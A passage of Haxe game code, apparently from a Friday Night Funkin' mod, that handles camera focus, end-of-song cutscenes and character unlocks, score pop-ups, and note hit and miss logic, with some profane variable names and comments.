				var tox = ((-Math.cos((elapsedexpungedtime / 9.5)) * 100) / 1980) * screenwidth;

				expungedOffset.x = ExpungedWindowCenterPos.x + tox;
				expungedOffset.y = ExpungedWindowCenterPos.y + toy;

				//center
				Application.current.window.y = Math.round(((screenheight / 2) - (720 / 2)) + (Math.sin((elapsedexpungedtime / 30)) * 80));
				Application.current.window.x = Std.int(windowSteadyX);
				Application.current.window.width = 1280;
				Application.current.window.height = 720;
			}

			if (lastFrame != null && dadFrame != null && lastFrame.name != dadFrame.name)
			{
				expungedSpr.graphics.clear();
				generateWindowSprite();
				lastFrame = dadFrame;
			}

			expungedScroll.x = (((dadFrame.offset.x) - (dad.offset.x)) * expungedScroll.scaleX) + 80;
			expungedScroll.y = (((dadFrame.offset.y) - (dad.offset.y)) * expungedScroll.scaleY);
		}
	}
	

	function FlingCharacterIconToOblivionAndBeyond(e:FlxTimer = null):Void
	{
		iconP2.changeIcon(AUGHHHH);
		
		BAMBICUTSCENEICONHURHURHUR.changeIcon(AHHHHH);
		BAMBICUTSCENEICONHURHURHUR.changeState(iconP2.getState());
		stupidx = -5;
		stupidy = -5;
		updatevels = true;
	}
	function destroyNote(note:Note)
	{
		note.active = false;
		note.visible = false;
		note.kill();
		notes.remove(note, true);
		note.destroy();
	}
	function yFromNoteStrumTime(note:Note, strumLine:FlxSprite, downScroll:Bool):Float
	{
		var change = downScroll ? -1 : 1;
		var speed:Float = SONG.speed;
		if (localFunny == CharacterFunnyEffect.Tristan)
		{
			speed += (Math.sin(elapsedtime / 5)) * 1;
		}
		var val:Float = strumLine.y - (Conductor.songPosition - note.strumTime) * (change * 0.45 * FlxMath.roundDecimal(speed * note.LocalScrollSpeed, 2));
		if (note.isSustainNote && downScroll && note.animation != null)
		{
			if (note.animation.curAnim.name.endsWith('end'))
			{
				val += (note.height * 2.05);
			}
		}
		return val;
	}
	function ZoomCam(focusondad:Bool):Void
	{
		var bfplaying:Bool = false;
		if (focusondad)
		{
			notes.forEachAlive(function(daNote:Note)
			{
				if (!bfplaying)
				{
					if (daNote.mustPress)
					{
						bfplaying = true;
					}
				}
			});
			if (UsingNewCam && bfplaying)
			{
				return;
			}
		}
		if (!lockCam)
		{
			if (focusondad)
			{
				camFollow.setPosition(dad.getMidpoint().x + 150, dad.getMidpoint().y - 100);
				// camFollow.setPosition(lucky.getMidpoint().x - 120, lucky.getMidpoint().y + 210);

				switch (dad.curCharacter)
				{
					case 'playrobot':
						camFollow.x = dad.getMidpoint().x + 50;
					case 'playrobot-shadow':
						camFollow.x = dad.getMidpoint().x + 50;
						camFollow.y -= 100;
					case 'dave-angey' | 'dave-festival-3d' | 'dave-3d-recursed':
						camFollow.y = dad.getMidpoint().y;
					case 'nofriend':
						camFollow.x = dad.getMidpoint().x + 50;
						camFollow.y = dad.getMidpoint().y - 50;
					case 'bambi-3d':
						camFollow.x = dad.getMidpoint().x;
						camFollow.y -= 50;
				}

				if (SONG.song.toLowerCase() == 'warmup')
				{
					tweenCamIn();
				}

				bfNoteCamOffset[0] = 0;
				bfNoteCamOffset[1] = 0;

				camFollow.x += dadNoteCamOffset[0];
				camFollow.y += dadNoteCamOffset[1];
			}
			else
			{
				camFollow.setPosition(boyfriend.getMidpoint().x - 100, boyfriend.getMidpoint().y - 100);
	
				switch (boyfriend.curCharacter)
				{
					case 'bf-pixel':
						camFollow.x = boyfriend.getMidpoint().x - 200;
						camFollow.y = boyfriend.getMidpoint().y - 250;
					case 'bf-3d':
						camFollow.y += 100;
					case 'dave-angey':
						camFollow.y = boyfriend.getMidpoint().y;
					case 'bambi-3d':
						camFollow.x = boyfriend.getMidpoint().x - 375;
						camFollow.y = boyfriend.getMidpoint().y - 200;
					case 'dave-fnaf':
						camFollow.x += 100;
				}
				dadNoteCamOffset[0] = 0;
				dadNoteCamOffset[1] = 0;

				camFollow.x += bfNoteCamOffset[0];
				camFollow.y += bfNoteCamOffset[1];

				if (SONG.song.toLowerCase() == 'warmup')
				{
					FlxTween.tween(FlxG.camera, {zoom: 1}, (Conductor.stepCrochet * 4 / 1000), {ease: FlxEase.sineInOut});
				}
			}
			switch (SONG.song.toLowerCase())
			{
				case 'escape-from-california':
					camFollow.y += 150;
			}
		}
	}


	function THROWPHONEMARCELLO(e:FlxTimer = null):Void
	{
		STUPDVARIABLETHATSHOULDNTBENEEDED.animation.play("throw_phone");
		new FlxTimer().start(5.5, function(timer:FlxTimer)
		{ 
			if(isStoryMode) {
				FlxG.sound.music.stop();
				nextSong();
			}
			else {
				FlxG.switchState(new FreeplayState());
			}
		});
	}

	function endSong():Void
	{
		inCutscene = false;
		canPause = false;
		if (MathGameState.failedGame)
		{
			MathGameState.failedGame = false;
		}
		if (recursedStaticWeek)
		{
			recursedStaticWeek = false;
		}

		FlxG.sound.music.volume = 0;
		vocals.volume = 0;
		if (SONG.validScore)
		{
			trace("score is valid");

			FlxG.save.data.exploitationState = null;
			FlxG.save.flush();

			#if !switch
			Highscore.saveScore(SONG.song, songScore, storyDifficulty, characteroverride == "none"
				|| characteroverride == "bf" ? "bf" : characteroverride);
			#end
		}

		#if windows
		if (window != null)
		{
			closeExpungedWindow();
		}
		#end

		// Song Character Unlocks (Story Mode)
		if (isStoryMode)
		{
			switch (curSong.toLowerCase())
			{
				case "polygonized":
					CharacterSelectState.unlockCharacter('dave-angey');
			}
		}
		// Song Character Unlocks (Freeplay)
		else
		{
			switch (curSong.toLowerCase())
			{
				case "bonus-song":
					CharacterSelectState.unlockCharacter('dave');
				case "cheating":
					CharacterSelectState.unlockCharacter('bambi-3d');
			}
		}
		switch (SONG.song.toLowerCase())
		{
			case 'supernovae' | 'glitch' | 'master':
				Application.current.window.title = Main.applicationName;
			case 'exploitation':
				FlxG.save.data.exploitationState = '';
				Application.current.window.title = Main.applicationName;
				Main.toggleFuckedFPS(false);
			case 'five-nights':
				FlxG.mouse.visible = false;
		}
		if (isStoryMode)
		{
			campaignScore += songScore;

			var completedSongs:Array<String> = [];
			var mustCompleteSongs:Array<String> = ['House', 'Insanity', 'Polygonized', 'Blocked', 'Corn-Theft', 'Maze', 'Splitathon', 'Shredder', 'Greetings', 'Interdimensional', 'Rano'];
			var allSongsCompleted:Bool = true;
			if (FlxG.save.data.songsCompleted == null)
			{
				FlxG.save.data.songsCompleted = new Array<String>();
			}
			completedSongs = FlxG.save.data.songsCompleted;
			completedSongs.push(storyPlaylist[0]);
			for (i in 0...mustCompleteSongs.length)
			{
				if (!completedSongs.contains(mustCompleteSongs[i]))
				{
					allSongsCompleted = false;
					break;
				}
			}
			if (allSongsCompleted && CharacterSelectState.isLocked('tristan-golden'))
			{
				CharacterSelectState.unlockCharacter('tristan-golden');
			}
			FlxG.save.data.songsCompleted = completedSongs;
			FlxG.save.flush();

			storyPlaylist.remove(storyPlaylist[0]);

			if (storyPlaylist.length <= 0)
			{
				if(FlxTransitionableState.skipNextTransIn)
				{
					Transition.nextCamera = null;
				}
				switch (curSong.toLowerCase())
				{
					case 'polygonized':
						CharacterSelectState.unlockCharacter('tristan');
						if (health >= 0.1)
						{
							FlxG.switchState(new EndingState('goodEnding', 'goodEnding'));
						}
						else if (health < 0.1)
						{
							CharacterSelectState.unlockCharacter('dave-angey');
							FlxG.switchState(new EndingState('vomit_ending', 'badEnding'));
						}
						else
						{
							FlxG.switchState(new EndingState('badEnding', 'badEnding'));
						}
					case 'maze':
						canPause = false;
						FlxG.sound.music.volume = 0;
						vocals.volume = 0;
						generatedMusic = false; // stop the game from trying to generate anymore music and to just cease attempting to play the music in general
						boyfriend.stunned = true;
						var doof:DialogueBox = new DialogueBox(false, CoolUtil.coolTextFile(Paths.txt('dialogue/maze-endDialogue')));
						doof.scrollFactor.set();
						doof.finishThing = function()
						{
							CharacterSelectState.unlockCharacter('bambi-new');
							FlxG.sound.playMusic(Paths.music('freakyMenu'));
							FlxG.switchState(new StoryMenuState());
						};
						doof.cameras = [camDialogue];
						schoolIntro(doof, false);
					case 'splitathon':
						canPause = false;
						FlxG.sound.music.volume = 0;
						vocals.volume = 0;
						generatedMusic = false; // stop the game from trying to generate anymore music and to just cease attempting to play the music in general
						boyfriend.stunned = true;
						var doof:DialogueBox = new DialogueBox(false, CoolUtil.coolTextFile(Paths.txt('dialogue/splitathon-endDialogue')));
						doof.scrollFactor.set();
						doof.finishThing = function()
						{
							FlxG.sound.playMusic(Paths.music('freakyMenu'));
							FlxG.switchState(new StoryMenuState());
						};
						doof.cameras = [camDialogue];
						schoolIntro(doof, false);
					case 'rano':
						var menu:CreditsMenuState = new CreditsMenuState();
						menu.DoFunnyScroll = true;
						FlxG.switchState(menu);
					default:
						FlxG.sound.playMusic(Paths.music('freakyMenu'));
						FlxG.switchState(new StoryMenuState());
				}
				transIn = FlxTransitionableState.defaultTransIn;
				transOut = FlxTransitionableState.defaultTransOut;

				// if ()
				StoryMenuState.weekUnlocked[Std.int(Math.min(storyWeek + 1, StoryMenuState.weekUnlocked.length - 1))] = true;

				if (SONG.validScore)
				{
					Highscore.saveWeekScore(storyWeek, campaignScore,
						storyDifficulty, characteroverride == "none" || characteroverride == "bf" ? "bf" : characteroverride);
				}

				FlxG.save.data.weekUnlocked = StoryMenuState.weekUnlocked;
				FlxG.save.flush();
			}
			else
			{	
				switch (SONG.song.toLowerCase())
				{
					case 'insanity':
						canPause = false;
						FlxG.sound.music.volume = 0;
						vocals.volume = 0;
						generatedMusic = false; // stop the game from trying to generate anymore music and to just cease attempting to play the music in general
						boyfriend.stunned = true;
						var doof:DialogueBox = new DialogueBox(false, CoolUtil.coolTextFile(Paths.txt('dialogue/insanity-endDialogue')));
						doof.scrollFactor.set();
						doof.finishThing = nextSong;
						doof.cameras = [camDialogue];
						schoolIntro(doof, false);
					case 'splitathon':
						canPause = false;
						FlxG.sound.music.volume = 0;
						vocals.volume = 0;
						generatedMusic = false; // stop the game from trying to generate anymore music and to just cease attempting to play the music in general
						boyfriend.stunned = true;
						var doof:DialogueBox = new DialogueBox(false, CoolUtil.coolTextFile(Paths.txt('dialogue/splitathon-endDialogue')));
						doof.scrollFactor.set();
						doof.finishThing = nextSong;
						doof.cameras = [camDialogue];
						schoolIntro(doof, false);
					case 'greetings':
						isGreetingsCutscene = true;
						greetingsCutsceneSetup();
					case 'interdimensional':
						canPause = false;
						FlxG.sound.music.volume = 0;
						vocals.volume = 0;
						generatedMusic = false; // stop the game from trying to generate anymore music and to just cease attempting to play the music in general
						boyfriend.stunned = true;
						var doof:DialogueBox = new DialogueBox(false, CoolUtil.coolTextFile(Paths.txt('dialogue/interdimensional-endDialogue')), false);
						doof.scrollFactor.set();
						doof.finishThing = nextSong;
						doof.cameras = [camDialogue];
						schoolIntro(doof, false);
					case 'glitch':
						canPause = false;
						FlxG.sound.music.volume = 0;
						vocals.volume = 0;
						var marcello:FlxSprite = new FlxSprite(dad.x - 170, dad.y);
						marcello.flipX = true;
						add(marcello);
						marcello.antialiasing = true;
						marcello.color = 0xFF878787;
						dad.visible = false;
						boyfriend.stunned = true;
						marcello.frames = Paths.getSparrowAtlas('joke/cutscene', 'shared');
						marcello.animation.addByPrefix('throw_phone', 'bambi0', 24, false);
						FlxG.sound.play(Paths.sound('break_phone'), 1, false, null, true);
						boyfriend.playAnim('hit', true);
						STUPDVARIABLETHATSHOULDNTBENEEDED = marcello;
						new FlxTimer().start(5.5, THROWPHONEMARCELLO);
					default:
						nextSong();
				}
			}
		}
		else
		{
			switch (SONG.song.toLowerCase())
			{
				case 'glitch':
					canPause = false;
					FlxG.sound.music.volume = 0;
					vocals.volume = 0;
					var marcello:FlxSprite = new FlxSprite(dad.x, dad.y);
					marcello.flipX = true;
					add(marcello);
					marcello.antialiasing = true;
					marcello.color = getBackgroundColor(curStage);
					dad.visible = false;
					boyfriend.stunned = true;
					marcello.frames = Paths.getSparrowAtlas('joke/cutscene');
					marcello.animation.addByPrefix('throw_phone', 'bambi0', 24, false);
					FlxG.sound.play(Paths.sound('break_phone'), 1, false, null, true);
					boyfriend.playAnim('hit', true);
					STUPDVARIABLETHATSHOULDNTBENEEDED = marcello;
					new FlxTimer().start(5.5, THROWPHONEMARCELLO);
				default:
					if (localFunny == CharacterFunnyEffect.Recurser)
					{
						FlxG.switchState(new FunnyTextState(CoolUtil.coolTextFile(Paths.txt('dialogue/recurser-post'))));
						if(FlxTransitionableState.skipNextTransIn)
						{
							Transition.nextCamera = null;
						}
						return;
					}
					FlxG.switchState(new FreeplayState());
			}
			if(FlxTransitionableState.skipNextTransIn)
			{
				Transition.nextCamera = null;
			}
		}
	}

	var endingSong:Bool = false;

	function nextSong()
	{
		FlxTransitionableState.skipNextTransIn = true;
		FlxTransitionableState.skipNextTransOut = true;
		prevCamFollow = camFollow;

		PlayState.SONG = Song.loadFromJson(PlayState.storyPlaylist[0]);
		FlxG.sound.music.stop();

		switch (curSong.toLowerCase())
		{
			case 'corn-theft':
				playEndCutscene('mazeCutscene');
			default:
				LoadingState.loadAndSwitchState(new PlayState());
		}
	}
	function greetingsCutsceneSetup()
	{
		FlxTransitionableState.skipNextTransIn = true;
		FlxTransitionableState.skipNextTransOut = true;
		prevCamFollow = camFollow;

		SONG = Song.loadFromJson('greetings');
		SONG.player2 = 'dave-festival';
		FlxG.sound.music.stop();
		
		LoadingState.loadAndSwitchState(new PlayState());
	}
	function greetingsCutscene()
	{
		canPause = false;
		boyfriend.canDance = false;
		dad.canDance = false;
		dad.playAnim('scared',true);
		gf.canDance = false;

		boyfriend.playAnim('scared', true);
		gf.playAnim('scared', true);

		FlxTween.tween(camHUD, {alpha: 0}, 1);
		FlxG.camera.shake(0.0175, 999);
		FlxG.sound.playMusic(Paths.sound('rumble', 'shared'), 0.8, true, null);
		new FlxTimer().start(2, function(timer:FlxTimer)
		{
			originalPosition = dad.getPosition();
			daveFlying = true;
			
			new FlxTimer().start(3, function(timer:FlxTimer)
			{
				FlxG.sound.play(Paths.sound('transition', 'shared'), 1, false, null, false);
				FlxG.camera.fade(FlxColor.WHITE, 3, false, function()
				{
					daveFlying = false;
					isGreetingsCutscene = false;
					dad.setPosition(originalPosition.x, originalPosition.y);
					camFollow.setPosition(originalPosition.x,originalPosition.y);

					FlxG.camera.stopFX();
					FlxG.camera.fade(FlxColor.BLACK, 0);
					
					FlxG.sound.music.stop();
					FlxG.sound.music.fadeOut(1.9, 0);
					vocals.stop();

					canPause = false;
					hasDialogue = true;

					var doof:DialogueBox = new DialogueBox(false, CoolUtil.coolTextFile(Paths.txt('dialogue/greetings-cutscene')), false);
					doof.scrollFactor.set();
					doof.cameras = [camDialogue];
					doof.finishThing = function()
					{
						new FlxTimer().start(1, function(timer:FlxTimer)
						{
							nextSong();
						});
					};
					schoolIntro(doof, false);
				});
			});
		});
	}

	public function createScorePopUp(daX:Float, daY:Float, autoPos:Bool, daRating:String, daCombo:Int, daStyle:String):Void
	{
		var assetPath:String = '';
		switch (daStyle)
		{
			case '3D' | 'shape':
			  	assetPath = '3D/';
		}

		var placement:String = Std.string(daCombo);

		var coolText:FlxText = new FlxText(daX, daY, 0, placement, 32);
		if (autoPos)
		{
			coolText.screenCenter();
			coolText.x = FlxG.width * 0.55;
		}
		var rating = new FlxSprite().loadGraphic(Paths.image("ui/" + assetPath + daRating));
		rating.screenCenter();
		rating.x = coolText.x - 40;
		rating.y -= 60;
		rating.acceleration.y = 550;
		rating.velocity.y -= FlxG.random.int(140, 175);
		rating.velocity.x -= FlxG.random.int(0, 10);

		var comboSpr:FlxSprite = new FlxSprite().loadGraphic(Paths.image("ui/" + assetPath + "combo"));
		comboSpr.screenCenter();
		comboSpr.x = coolText.x;
		comboSpr.acceleration.y = 600;
		comboSpr.velocity.y -= 150;

		comboSpr.velocity.x += FlxG.random.int(1, 10);
		add(rating);
		if (combo >= 10)
		{
			add(comboSpr);
		}

		rating.setGraphicSize(Std.int(rating.width * 0.7));
		rating.antialiasing = true;
		comboSpr.setGraphicSize(Std.int(comboSpr.width * 0.7));
		comboSpr.antialiasing = true;

		comboSpr.updateHitbox();
		rating.updateHitbox();

		var seperatedScore:Array<Int> = [];

		var comboSplit:Array<String> = (daCombo + "").split('');

		if (comboSplit.length == 2)
			seperatedScore.push(0); // make sure theres a 0 in front or it looks weird lol!

		for (i in 0...comboSplit.length)
		{
			var str:String = comboSplit[i];
			seperatedScore.push(Std.parseInt(str));
		}

		var daLoop:Int = 0;
		for (i in seperatedScore)
		{
			var numScore:FlxSprite = new FlxSprite().loadGraphic(Paths.image("ui/" + assetPath + "num" + Std.int(i)));
			numScore.screenCenter();
			numScore.x = coolText.x + (43 * daLoop) - 90;
			numScore.y += 80;

			numScore.antialiasing = true;
			numScore.setGraphicSize(Std.int(numScore.width * 0.5));
			numScore.updateHitbox();

			numScore.acceleration.y = FlxG.random.int(200, 300);
			numScore.velocity.y -= FlxG.random.int(140, 160);
			numScore.velocity.x = FlxG.random.float(-5, 5);

			if (daCombo >= 10 || daCombo == 0)
				add(numScore);

			FlxTween.tween(numScore, {alpha: 0}, 0.2, {
				onComplete: function(tween:FlxTween)
				{
					numScore.destroy();
				},
				startDelay: Conductor.crochet * 0.002
			});

			daLoop++;
		}
		/* 
			trace(combo);
			trace(seperatedScore);
		*/

		coolText.text = Std.string(seperatedScore);
		// add(coolText);

		FlxTween.tween(rating, {alpha: 0}, 0.2, {
			startDelay: Conductor.crochet * 0.001
		});

		FlxTween.tween(comboSpr, {alpha: 0}, 0.2, {
			onComplete: function(tween:FlxTween)
			{
				coolText.destroy();
				comboSpr.destroy();

				rating.destroy();
			},
			startDelay: Conductor.crochet * 0.001
		});
	}


	private function popUpScore(strumtime:Float, note:Note):Void
	{
		var noteDiff:Float = Math.abs(strumtime - Conductor.songPosition);
		// boyfriend.playAnim('hey');
		vocals.volume = 1;

		var score:Int = 350;

		var daRating:String = "sick";

		if (noteDiff > Conductor.safeZoneOffset * 2)
		{
			daRating = 'shit';
			totalNotesHit -= 2;
			score = 10;
			ss = false;
			shits++;
		}
		else if (noteDiff < Conductor.safeZoneOffset * -2)
		{
			daRating = 'shit';
			totalNotesHit -= 2;
			score = 25;
			ss = false;
			shits++;
		}
		else if (noteDiff > Conductor.safeZoneOffset * 0.45)
		{
			daRating = 'bad';
			score = 100;
			totalNotesHit += 0.2;
			ss = false;
			bads++;
		}
		else if (noteDiff > Conductor.safeZoneOffset * 0.25)
		{
			daRating = 'good';
			totalNotesHit += 0.65;
			score = 200;
			ss = false;
			goods++;
		}
		if (daRating == 'sick')
		{
			totalNotesHit += 1;
			sicks++;
		}
		score = cast(FlxMath.roundDecimal(cast(score, Float) * curmult[note.noteData], 0), Int); //this is old code thats stupid Std.Int exists but i dont feel like changing this

		if (!noMiss)
		{
			songScore += score;
		}

		if (!inFiveNights)
		{
			switch (SONG.song.toLowerCase())
			{
				case 'bot-trot':
					createScorePopUp(-400, 300, true, daRating, combo, note.noteStyle);
				default:
					createScorePopUp(0,0, true, daRating, combo, note.noteStyle);
			}
			
		}
		curSection += 1;
	}

	public function NearlyEquals(value1:Float, value2:Float, unimportantDifference:Float = 10):Bool
	{
		return Math.abs(FlxMath.roundDecimal(value1, 1) - FlxMath.roundDecimal(value2, 1)) < unimportantDifference;
	}

	var upHold:Bool = false;
	var downHold:Bool = false;
	var rightHold:Bool = false;
	var leftHold:Bool = false;

	private function keyShit():Void
	{
		// HOLDING
		var up = controls.UP;
		var right = controls.RIGHT;
		var down = controls.DOWN;
		var left = controls.LEFT;

		var key5 = controls.KEY5 && (SONG.song.toLowerCase() == 'polygonized' || SONG.song.toLowerCase() == 'interdimensional') && localFunny != CharacterFunnyEffect.Recurser;

		if (pressingKey5Global != key5)
		{
			pressingKey5Global = key5;
			regenerateStaticArrows(1, false);
		}
		
		playerStrums.forEach(function(strum:StrumNote)
		{
			strum.pressingKey5 = key5;
		});

		var upP = controls.UP_P;
		var rightP = controls.RIGHT_P;
		var downP = controls.DOWN_P;
		var leftP = controls.LEFT_P;

		var upR = controls.UP_R;
		var rightR = controls.RIGHT_R;
		var downR = controls.DOWN_R;
		var leftR = controls.LEFT_R;

		var controlArray:Array<Bool> = [leftP, downP, upP, rightP];
		var releaseArray:Array<Bool> = [leftR, downR, upR, rightR];

		if (noteLimbo != null)
		{
			if (noteLimbo.exists)
			{
				if (noteLimbo.wasGoodHit)
				{
					if (key5 && noteLimbo.noteStyle == 'shape')
					{
						goodNoteHit(noteLimbo);
						if (noteLimbo.wasGoodHit)
						{
							noteLimbo.kill();
							notes.remove(noteLimbo, true);
							noteLimbo.destroy();
						}
						noteLimbo = null;
					}
					else if (!key5 && noteLimbo.noteStyle != 'shape')
					{
						goodNoteHit(noteLimbo);
						if (noteLimbo.wasGoodHit)
						{
							noteLimbo.kill();
							notes.remove(noteLimbo, true);
							noteLimbo.destroy();
						}
						noteLimbo = null;
					}
				}
				else
				{
					noteLimbo = null;
				}
			}
		}

		if (noteLimboFrames != 0)
		{
			noteLimboFrames--;
		}
		else
		{
			noteLimbo = null;
		}

		// FlxG.watch.addQuick('asdfa', upP);
		if ((upP || rightP || downP || leftP) && !boyfriend.stunned && generatedMusic)
		{
			boyfriend.holdTimer = 0;

			possibleNotes = [];

			var ignoreList:Array<Int> = [];

			notes.forEachAlive(function(daNote:Note)
			{
				if (daNote.canBeHit && daNote.mustPress && !daNote.tooLate && !daNote.wasGoodHit && !daNote.isSustainNote && daNote.finishedGenerating)
				{
					possibleNotes.push(daNote);
				}
			});

			haxe.ds.ArraySort.sort(possibleNotes, function(a, b):Int {
				var notetypecompare:Int = Std.int(a.noteData - b.noteData);

				if (notetypecompare == 0)
				{
					return Std.int(a.strumTime - b.strumTime);
				}
				return notetypecompare;
			});

			if (possibleNotes.length > 0)
			{
				var daNote = possibleNotes[0];

				if (perfectMode)
					noteCheck(true, daNote);

				// Jump notes
				var lasthitnote:Int = -1;
				var lasthitnotetime:Float = -1;

				for (note in possibleNotes) 
				{
					if (!note.mustPress)
					{
						continue; //how did this get here
					}
					if (controlArray[note.noteData % 4])
					{ //further tweaks to the conductor safe zone offset multiplier needed.
						if (lasthitnotetime > Conductor.songPosition - Conductor.safeZoneOffset
							&& lasthitnotetime < Conductor.songPosition + (Conductor.safeZoneOffset * 0.08)) //reduce the past allowed barrier just so notes close together that aren't jacks dont cause missed inputs
						{
							if ((note.noteData % 4) == (lasthitnote % 4))
							{
								lasthitnotetime = -999999; //reset the last hit note time
								continue; //the jacks are too close together
							}
						}
						if (note.noteStyle == 'shape' && !key5 || note.noteStyle != 'shape' && key5)
						{
							//FlxG.sound.play(Paths.sound('ANGRY'), FlxG.random.float(0.2, 0.3));
							noteLimbo = note;
							noteLimboFrames = 8; //note limbo, the place where notes that could've been hit go.
							continue;
						}
						lasthitnote = note.noteData;
						lasthitnotetime = note.strumTime;
						goodNoteHit(note);
					}
				}
				
				if (daNote.wasGoodHit)
				{
					daNote.kill();
					notes.remove(daNote, true);
					daNote.destroy();
				}
			}
			else if (!theFunne)
			{
				if(!inCutscene)
					badNoteCheck(null);
			}
		}

		if ((up || right || down || left) && generatedMusic)
		{
			notes.forEachAlive(function(daNote:Note)
			{
				if (daNote.canBeHit && daNote.mustPress && daNote.isSustainNote)
				{
					if ((daNote.noteStyle == 'shape' && key5) || (daNote.noteStyle != 'shape' && !key5))
					{
						switch (daNote.noteData)
						{
							// NOTES YOU ARE HOLDING
							case 2:
								if (up || upHold)
									goodNoteHit(daNote);
							case 3:
								if (right || rightHold)
									goodNoteHit(daNote);
							case 1:
								if (down || downHold)
									goodNoteHit(daNote);
							case 0:
								if (left || leftHold)
									goodNoteHit(daNote);
						}
					}
				}
			});
		}

		if (boyfriend.holdTimer > Conductor.stepCrochet * 4 * 0.001 && !up && !down && !right && !left)
		{
			if ((boyfriend.animation.curAnim.name.startsWith('sing')) && !boyfriend.animation.curAnim.name.endsWith('miss'))
			{
				boyfriend.playAnim('idle');
				
				bfNoteCamOffset[0] = 0;
				bfNoteCamOffset[1] = 0;
			}
		}

		playerStrums.forEach(function(spr:StrumNote)
		{
			if (controlArray[spr.ID] && spr.animation.curAnim.name != 'confirm')
			{
				spr.animation.play('pressed');
			}
			if (releaseArray[spr.ID])
			{
				spr.animation.play('static');
			}

			if (spr.animation.curAnim.name == 'confirm')
			{
				spr.centerOffsets();
				spr.offset.x -= 13;
				spr.offset.y -= 13;
			}
			else
				spr.centerOffsets();
		});
	}

	function noteMiss(direction:Int = 1, note:Note):Void
	{
		if (true)
		{
			misses++;	
			if (inFiveNights)
			{
				health -= 0.004;
			}
			else
			{
				health -= 0.04;
			}
			if (combo > 5)
			{
				gf.playAnim('sad');
			}
			combo = 0;
			songScore -= 100;

			if (note != null)
			{
				switch (note.noteStyle)
				{
					case 'text':
						recursedNoteMiss();
					case 'phone':
						var hitAnimation:Bool = boyfriend.animation.getByName("hit") != null;
						boyfriend.playAnim(hitAnimation ? 'hit' : 'singRIGHTmiss', true);
						FlxTween.cancelTweensOf(note.MyStrum);
						note.MyStrum.alpha = 0.01;
						var noteTween = FlxTween.tween(note.MyStrum, {alpha: 1}, 7, {ease: FlxEase.expoIn});
						pauseTweens.push(noteTween);
						health -= 0.07;
						updateAccuracy();
						return;
				}
			}
			var deathSound:FlxSound = new FlxSound();
			switch (curSong.toLowerCase())
			{
				case 'overdrive':
					deathSound.loadEmbedded(Paths.sound('bad_disc'));
				case 'vs-dave-rap' | 'vs-dave-rap-two':
					deathSound.loadEmbedded(Paths.sound('deathbell'));
				default:
					deathSound.loadEmbedded(Paths.soundRandom('missnote', 1, 3));
			}
			deathSound.volume = FlxG.random.float(0.1, 0.2);
			deathSound.play();

			// FlxG.sound.play(Paths.sound('missnote1'), 1, false);
			// FlxG.log.add('played imss note');
			
			var noteTypes = guitarSection ? notestuffsGuitar : notestuffs;
			var noteToPlay:String = noteTypes[Math.round(Math.abs(direction)) % playerStrumAmount];
			if (!boyfriend.nativelyPlayable)
			{
				switch (noteToPlay)
				{
					case 'LEFT':
						noteToPlay = 'RIGHT';
					case 'RIGHT':
						noteToPlay = 'LEFT';
				}
			}
			if (boyfriend.animation.getByName('sing${noteToPlay}miss') != null)
			{
				boyfriend.playAnim('sing' + noteToPlay + "miss", true);
			}
			else
			{
				boyfriend.color = 0xFF000084;
				boyfriend.playAnim('sing' + noteToPlay, true);
			}
			updateAccuracy();
		}
	}

	function cameraMoveOnNote(note:Int, character:String)
	{
		var amount:Array<Float> = new Array<Float>();
		var followAmount:Float = FlxG.save.data.noteCamera ? 20 : 0;
		switch (note)
		{
			case 0:
				amount[0] = -followAmount;
				amount[1] = 0;
			case 1:
				amount[0] = 0;
				amount[1] = followAmount;
			case 2:
				amount[0] = 0;
				amount[1] = -followAmount;
			case 3:
				amount[0] = followAmount;
				amount[1] = 0;
		}
		switch (character)
		{
			case 'dad':
				dadNoteCamOffset = amount;
			case 'bf':
				bfNoteCamOffset = amount;
		}
	}

	function badNoteCheck(note:Note = null)
	{
		// just double pasting this shit cuz fuk u
		// REDO THIS SYSTEM!
		if (note != null)
		{
			if(note.mustPress && note.finishedGenerating)
			{
				if (!noMiss)
					noteMiss(note.noteData, note);
			}
			return;
		}
		var upP = controls.UP_P;
		var rightP = controls.RIGHT_P;
		var downP = controls.DOWN_P;
		var leftP = controls.LEFT_P;

		var controlArray:Array<Bool> = [leftP, downP, upP, rightP];

		for (i in 0...controlArray.length)
		{
			if (controlArray[i])
			{
				if (!noMiss)
					noteMiss(i, note);
			}	
		}
		updateAccuracy();
	}

	function updateAccuracy()
	{
		if (misses > 0 || accuracy < 96)
			fc = false;
		else
			fc = true;
		totalPlayed += 1;
		accuracy = totalNotesHit / totalPlayed * 100;
	}

	function noteCheck(keyP:Bool, note:Note):Void // sorry lol
	{
		if (keyP)
		{
			goodNoteHit(note);
		}
		else if (!theFunne)
		{
			badNoteCheck(note);
		}
	}

	function goodNoteHit(note:Note):Void
	{
		if (!note.wasGoodHit)
		{
			if (!note.isSustainNote)
			{
				popUpScore(note.strumTime, note);
				if (FlxG.save.data.donoteclick)
				{
					FlxG.sound.play(Paths.sound('note_click'));
				}
				combo += 1;
			}
			else
				totalNotesHit += 1;

			if (!isRecursed)
			{
				if (inFiveNights)
				{
					health += 0.0023;
				}
				else
				{
					health += 0.023;
				}
			}
			if (darkLevels.contains(curStage) && SONG.song.toLowerCase() != "polygonized" && formoverride != 'tristan-golden-glowing' && bfTween == null)
			{
				boyfriend.color = nightColor;
			}
			else if (sunsetLevels.contains(curStage) && bfTween == null)
			{
				boyfriend.color = sunsetColor;
			}
			else if (bfTween == null)
			{
				boyfriend.color = FlxColor.WHITE;
			}
			else
			{
				if (!bfTween.active && !bfTween.finished)
				{
					bfTween.active = true;
				}
				boyfriend.color = bfTween.color;
			}


			switch (note.noteStyle)
			{
				default:
					//'LEFT', 'DOWN', 'UP', 'RIGHT'

					var fuckingDumbassBullshitFuckYou:String;
					var noteTypes = guitarSection ? notestuffsGuitar : notestuffs;
					fuckingDumbassBullshitFuckYou = noteTypes[Math.round(Math.abs(note.originalType)) % playerStrumAmount];
					if(!boyfriend.nativelyPlayable)
					{
						switch(noteTypes[Math.round(Math.abs(note.originalType)) % playerStrumAmount])
						{
							case 'LEFT':
								fuckingDumbassBullshitFuckYou = 'RIGHT';
							case 'RIGHT':
								fuckingDumbassBullshitFuckYou = 'LEFT';
						}
					}
					boyfriend.playAnim('sing' + fuckingDumbassBullshitFuckYou, true);

				case 'phone':
					var hitAnimation:Bool = boyfriend.animation.getByName("dodge") != null;
					var heyAnimation:Bool = boyfriend.animation.getByName("hey") != null;
					boyfriend.playAnim(hitAnimation ? 'dodge' : (heyAnimation ? 'hey' : 'singUPmiss'), true);
					gf.playAnim('cheer', true);
					if (note.health != 2)
					{
